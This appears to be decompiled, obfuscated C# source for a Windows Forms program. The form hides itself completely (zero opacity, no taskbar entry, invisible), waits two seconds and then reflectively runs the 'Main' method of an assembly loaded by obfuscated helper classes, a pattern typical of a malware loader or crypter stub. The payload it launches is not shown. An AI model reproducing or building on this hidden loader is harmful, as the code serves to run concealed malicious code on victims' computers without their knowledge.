using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace Final;

[DesignerGenerated]
public class Form1 : Form
{
	internal IContainer icontainer_0;

	internal ProgressBar progressBar_0;

	internal Label label_0;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		vmethod_1(new ProgressBar());
		vmethod_3(new Label());
		((Control)this).SuspendLayout();
		ProgressBar obj = vmethod_0();
		Point location = new Point(13, 75);
		((Control)obj).set_Location(location);
		((Control)vmethod_0()).set_Name("ProgressBar1");
		ProgressBar obj2 = vmethod_0();
		Size size = new Size(261, 11);
		((Control)obj2).set_Size(size);
		((Control)vmethod_0()).set_TabIndex(0);
		vmethod_2().set_AutoSize(true);
		Label obj3 = vmethod_2();
		location = new Point(62, 27);
		((Control)obj3).set_Location(location);
		((Control)vmethod_2()).set_Name("Label1");
		Label obj4 = vmethod_2();
		size = new Size(39, 13);
		((Control)obj4).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(1);
		vmethod_2().set_Text("Label1");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(286, 98);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual ProgressBar vmethod_0()
	{
		return progressBar_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(ProgressBar progressBar_1)
	{
		ProgressBar val = (progressBar_0 = progressBar_1);
	}

	[SpecialName]
	internal virtual Label vmethod_2()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(Label label_1)
	{
		Label val = (label_0 = label_1);
	}

	public void vuIH5s()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"]J\u0090l\u008dKO;mNiK,n=ni~M„gv>_4\u008d'|C;~R`A-*\u008dA,$n@+t\u0090$8Ff,‰28V„z+PW CeŠQb6~~`2tHqI5Fj]b0tt66El9*PF’\\|,t)Hl1y9M", (MsgBoxStyle)0, (object)null);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Visible(false);
		one();
	}

	public void one()
	{
		Thread.Sleep(2000);
		Class3.Class4.smethod_0(Class5.smethod_0(), "Class1", "Main", new object[0]);
	}
}
